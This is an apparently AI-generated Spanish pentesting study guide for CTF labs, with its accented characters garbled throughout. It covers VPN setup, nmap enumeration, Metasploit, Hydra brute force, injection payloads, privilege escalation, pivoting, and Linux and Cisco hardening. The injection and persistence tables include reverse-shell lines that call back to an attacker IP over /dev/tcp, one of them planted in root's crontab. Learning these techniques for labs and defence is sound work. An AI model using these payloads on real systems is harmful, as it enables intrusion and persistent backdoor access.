# üìñ Gu√≠a Maestra de Pentesting, Redes y Defensa
*S√≠ntesis y Metodolog√≠a de √âlite para Operaciones de Ciberseguridad*

---

## üéØ MISI√ìN Y FILOSOF√çA DE DISE√ëO (KISS / TL;DR)
Este manual consolida, enriquece y ordena la inteligencia de campo que ha recopilado. Su prop√≥sito es ser una gu√≠a de referencia √∫nica, desde la configuraci√≥n del entorno hasta la exfiltraci√≥n y defensa, eliminando ambig√ºedades y siguiendo un flujo operativo l√≥gico. Se abordan directamente sus puntos de frustraci√≥n sobre el descubrimiento de redes y la conectividad.

---

## üì° FASE 0: CONFIGURACI√ìN DEL LABORATORIO Y CONECTIVIDAD
*Esta secci√≥n resuelve las dudas fundamentales sobre el descubrimiento de la red y la m√°quina objetivo.*

### 1. El Dilema de la Red: ¬øNAT, Red Interna o VPN?

Usted pregunt√≥ c√≥mo descubrir su red y la m√°quina CTF. La respuesta depende del escenario.

*   **Escenario 1: Laboratorio Local (M√°quinas Virtuales en su PC)**
    *   **M√©todo Recomendado:** **Red NAT Personalizada** (como en su `pentesting3.md`) o **Red Interna** en VirtualBox/VMware.
    *   **¬øPor qu√©?** Crea una red aislada y controlada solo para sus m√°quinas (atacante y v√≠ctima). Usted define el rango de red (ej: `192.168.1.0/24`), por lo que **no hay necesidad de "descubrir" la red**, usted ya la conoce.
    *   **Descubrimiento del Host:** Una vez en la misma red, el descubrimiento del host objetivo se simplifica a un escaneo de ping o ARP en ese rango conocido.
    *   **Ejemplo Pr√°ctico (Su Propio M√©todo Validado):**
        1.  **Kali (Atacante):** IP est√°tica `192.168.1.100`
        2.  **CTF (V√≠ctima):** IP est√°tica `192.168.1.150`
        3.  **Comando de Descubrimiento:** `sudo nmap -sn 192.168.1.0/24` o `arp-scan -l`. Estos comandos revelar√°n la IP `192.168.1.150` porque est√° en el mismo segmento de red que usted ha definido.

*   **Escenario 2: Plataformas Externas (Hack The Box, TryHackMe)**
    *   **M√©todo Obligatorio:** **Conexi√≥n VPN.**
    *   **¬øQu√© es el archivo `.ovpn`?** Es un archivo de configuraci√≥n de OpenVPN. Estas plataformas le proporcionan este archivo para que usted pueda crear un t√∫nel seguro y cifrado desde su m√°quina Kali directamente a la red del laboratorio de ellos.
    *   **¬øC√≥mo funciona?**
        1.  Usted ejecuta `sudo openvpn su_archivo.ovpn`.
        2.  Su m√°quina obtiene una nueva interfaz de red virtual (generalmente `tun0`) con una IP en la red de la plataforma (ej: `10.10.14.5`).
        3.  La m√°quina CTF que le asignan (ej: `10.10.10.3`) est√° en esa misma red remota.
        4.  **Descubrimiento:** No necesita descubrir la red. La plataforma le da la IP del objetivo. Su √∫nica tarea es verificar la conectividad con `ping 10.10.10.3`. Si el ping funciona, su t√∫nel VPN est√° activo y puede comenzar el ataque.

**TL;DR:**
- **Laboratorio local:** Use Red NAT/Interna, asigne IPs manualmente. El descubrimiento es un `nmap -sn` en el rango que usted mismo cre√≥.
- **Hack The Box/TryHackMe:** Use el archivo `.ovpn` que le dan. Le dir√°n la IP del objetivo. El descubrimiento es solo un `ping` para confirmar que la VPN funciona.

---

## üîç FASE 1: RECONOCIMIENTO Y ENUMERACI√ìN
*Metodolog√≠a unificada para el mapeo de la superficie de ataque.*

### 1.1. Descubrimiento de Hosts y Puertos

Esta tabla combina los comandos de sus gu√≠as en una secuencia l√≥gica.

| Tarea | Comando | Flags Clave y Funci√≥n (TL;DR) |
|---|---|---|
| **1. Conexi√≥n a Red Externa** | `sudo openvpn archivo.ovpn` | `-`: Establece t√∫nel seguro a redes como HTB/THM. |
| **2. Verificar mi IP** | `ifconfig tun0` o `ip a` | `-`: Confirma que tengo una IP en la red objetivo. |
| **3. Verificar Conectividad** | `ping -c 1 [IP_OBJETIVO]` | `-c 1`: Env√≠a 1 paquete para ver si el host responde. |
| **4. Descubrir Hosts Activos** | `sudo nmap -sn [RANGO_RED]` | `-sn`: Ping Scan. No escanea puertos, solo ve qui√©n est√° vivo. |
| **5. Escaneo R√°pido Puertos** | `nmap [IP_OBJETIVO]` | `-`: Escanea los 1000 puertos m√°s comunes. |
| **6. Escaneo Completo TCP** | `nmap -p- -sS --min-rate 5000 [IP]` | `-p-`: Todos los 65535 puertos. `-sS`: Sigiloso. `--min-rate`: R√°pido. |
| **7. Escaneo Profundo** | `nmap -p[PUERTOS] -sC -sV -O [IP]` | `-p`: Puertos espec√≠ficos. `-sC`: Scripts default. `-sV`: Versiones. `-O`: SO. |
| **8. Enumeraci√≥n SMB** | `enum4linux -a [IP]` | `-a`: All. Enumera todo (usuarios, shares, etc.) de SMB. |
| **9. Listar Shares SMB** | `smbclient -L //[IP] -N` | `-L`: Listar. `-N`: Sin password (null session). |
| **10. Enumeraci√≥n Web** | `dirb http://[IP]` | `-`: Fuerza bruta de directorios y archivos web comunes. |
| **11. Escaneo Web Vulns** | `nikto -h http://[IP]` | `-h`: Host. Esc√°ner de vulnerabilidades web. |

### 1.2. An√°lisis de Servicios y Procesos (Local y Remoto)

| Tarea | Comando (Linux) | Comando (Windows) | Funci√≥n y Notas Clave |
|---|---|---|---|
| **Ver Conexiones y Puertos** | `sudo ss -tunap` | `netstat -ano` | `-tuna`: TCP, UDP, Num√©rico, All. `-p`: Proceso. |
| **Ver Solo Puertos en Escucha** | `sudo ss -tuln` | `netstat -ano \| findstr "LISTENING"` | `-tuln`: TCP, UDP, Listen, Num√©rico. **Comando clave para ver servicios.** |
| **Buscar Proceso por Puerto** | `sudo lsof -i :[PUERTO]` | `netstat -ano \| findstr ":[PUERTO]"` | Permite saber qu√© programa (PID) usa un puerto. |
| **Matar Proceso por PID** | `sudo kill -9 [PID]` | `taskkill /PID [PID] /F` | `-9`: Incondicional. `/F`: Forzar. Libera un puerto bloqueado. |

---

## ‚öîÔ∏è FASE 2: EXPLOTACI√ìN
*Acceso inicial al sistema objetivo.*

### 2.1. B√∫squeda y Uso de Exploits

| Tarea | Comando / Herramienta | Pasos y Notas Clave |
|---|---|---|
| **1. Buscar Exploit Local** | `searchsploit [servicio] [version]` | Busca en la base de datos local de Exploit-DB. Ej: `searchsploit proftpd 1.3.5`. |
| **2. Copiar Exploit** | `searchsploit -m [ID_EXPLOIT]` | `-m`: Mirror. Copia el exploit a tu directorio actual para examinarlo. |
| **3. Usar Metasploit** | `msfconsole -q` | `-q`: Quiet. Inicia Metasploit sin el banner. |
| **4. Buscar M√≥dulo** | `search [criterio]` | Busca exploits dentro de Metasploit. Ej: `search type:exploit platform:linux smb`. |
| **5. Seleccionar y Configurar** | `use [exploit]`, `show options`, `set RHOSTS [IP]`, `set LHOST [tun0/IP]` | `RHOSTS`: Remote Host (v√≠ctima). `LHOST`: Local Host (tu IP de atacante). |
| **6. Ejecutar** | `exploit` o `run` | Lanza el ataque. |

### 2.2. Ataques de Fuerza Bruta con Hydra

| Protocolo | Comando de Ejemplo con Hydra | Desglose de Flags |
|---|---|---|
| **SSH** | `hydra -L users.txt -P pass.txt ssh://[IP]` | `-L`: Lista de usuarios. `-P`: Lista de passwords. |
| **FTP** | `hydra -l user -P pass.txt ftp://[IP] -t 4` | `-l`: Usuario √∫nico. `-t 4`: 4 hilos/intentos en paralelo. |
| **Web Form**| `hydra -L u.txt -P p.txt [IP] http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"` | `http-post-form`: Especifica el formulario. `^USER^`: Placeholder. `:F=error`: String que indica fallo. |

### 2.3. Inyecci√≥n de Comandos y SQL

| Tipo de Inyecci√≥n | Payload de Ejemplo | Prop√≥sito |
|---|---|---|
| **Command Injection** | `127.0.0.1; whoami` | Ejecuta un comando adicional en el servidor. |
| **Blind Command Injection** | `127.0.0.1 && sleep 5` | Si la web tarda 5s m√°s en cargar, la inyecci√≥n es exitosa. |
| **Reverse Shell** | `IP; bash -i >& /dev/tcp/[TU_IP]/4444 0>&1` | El servidor se conecta de vuelta a tu m√°quina, d√°ndote una shell. |
| **SQL Injection** | `sqlmap -u "http://[IP]/page.php?id=1" --dbs --batch` | `-u`: URL. `--dbs`: Enumera las bases de datos. `--batch`: No interactivo. |

---

## üöÄ FASE 3: POST-EXPLOTACI√ìN Y MOVIMIENTO LATERAL
*Una vez dentro, el objetivo es escalar privilegios y expandir el control.*

### 3.1. Enumeraci√≥n Interna y Escalaci√≥n de Privilegios

| Tarea | Comando Clave | Funci√≥n y Qu√© Buscar |
|---|---|---|
| **1. ¬øQui√©n soy?** | `whoami` / `id` | Confirma tu usuario y grupos. Clave para saber tus permisos. |
| **2. ¬øQu√© sistema es?** | `uname -a` / `cat /etc/os-release` | Versi√≥n del Kernel y SO. √ötil para buscar exploits de escalaci√≥n. |
| **3. ¬øQu√© puedo ejecutar como root?** | `sudo -l` | Busca `(ALL) NOPASSWD: /path/to/binary`. Vector de escalaci√≥n f√°cil. |
| **4. Buscar Binarios SUID** | `find / -perm -u=s -type f 2>/dev/null` | Busca archivos que se ejecutan como root. Abusar de ellos es un vector cl√°sico (ver GTFOBins). |
| **5. Scripts Automatizados** | `linpeas.sh` / `LinEnum.sh` | Estos scripts buscan autom√°ticamente vectores de escalaci√≥n de privilegios. |
| **6. Explotar SUID/Sudo (GTFOBins)** | `sudo nmap --interactive` -> `!sh` | Ejemplo de c√≥mo un binario con permisos `sudo` puede darte una shell de root. |

### 3.2. Persistencia y Movimiento Lateral

| Tarea | T√©cnica | Comando de Ejemplo |
|---|---|---|
| **Persistencia con Cron** | A√±adir una tarea programada | `echo "* * * * * bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'" >> /var/spool/cron/root` |
| **Pivoting (Acceder a Red Interna)** | Proxy SOCKS con SSH | `ssh -D 9050 user@[IP_VICTIMA]` |
| **Usar el Pivot** | Configurar Proxychains | `proxychains nmap -sT -Pn [IP_INTERNA]` |
| **Transferir Archivos (Atacante -> V√≠ctima)** | Servidor Python + Wget | En Kali: `python3 -m http.server 80`. En V√≠ctima: `wget http://[IP_KALI]/archivo`. |

---

## üõ°Ô∏è FASE 4: DEFENSA Y CONFIGURACI√ìN DE RED (CISCO)
*Principios para asegurar la infraestructura.*

### 4.1. Hardening B√°sico

| √Årea | Medida de Seguridad | Comando / Configuraci√≥n |
|---|---|---|
| **Firewall (Linux)** | Bloquear una IP atacante | `sudo iptables -A INPUT -s [IP_ATACANTE] -j DROP` |
| **SSH** | Deshabilitar login de root | En `/etc/ssh/sshd_config`, poner `PermitRootLogin no`. |
| **SSH** | Forzar uso de llaves | En `/etc/ssh/sshd_config`, poner `PasswordAuthentication no`. |
| **Logs** | Monitorear fallos de login | `tail -f /var/log/auth.log \| grep "failed"` |

### 4.2. Fundamentos de Cisco CLI

| Tarea | Comando | Descripci√≥n |
|---|---|---|
| **Navegar Modos** | `enable` -> `configure terminal` -> `interface fa0/0` | User -> Privileged -> Global -> Interface. |
| **Guardar Configuraci√≥n** | `copy running-config startup-config` (o `wr`) | **CR√çTICO.** Guarda los cambios para que no se pierdan al reiniciar. |
| **Configurar VLAN** | `vlan 10` -> `name VENTAS` | Crea la VLAN 10 y le da un nombre. |
| **Asignar Puerto a VLAN** | `interface fa0/1` -> `switchport mode access` -> `switchport access vlan 10` | Pone el puerto 1 en modo acceso para la VLAN 10. |
| **Crear Troncal** | `interface fa0/24` -> `switchport mode trunk` | Permite que el puerto 24 pase tr√°fico de m√∫ltiples VLANs. |
| **Router on a Stick** | `interface g0/0.10` -> `encapsulation dot1q 10` -> `ip address [IP] [MASK]` | Crea una subinterfaz en el router para que act√∫e como gateway de la VLAN 10. |
| **Verificar IPs** | `show ip interface brief` | **El comando m√°s √∫til.** Muestra el estado y la IP de todas las interfaces. |
| **Verificar VLANs** | `show vlan brief` | Muestra qu√© puertos est√°n en qu√© VLAN. |
| **Verificar Rutas** | `show ip route` | Muestra la tabla de enrutamiento. Si ves redes `C` (Connected), todo va bien. |

---
Misi√≥n cumplida. Este manual ha sido generado y guardado como `Guia_Maestra_Pentesting.md` en su directorio de trabajo. Contiene la s√≠ntesis de sus tres documentos, enriquecida y ordenada, con especial atenci√≥n a resolver sus dudas sobre el descubrimiento de redes y la conectividad VPN. Proceda.
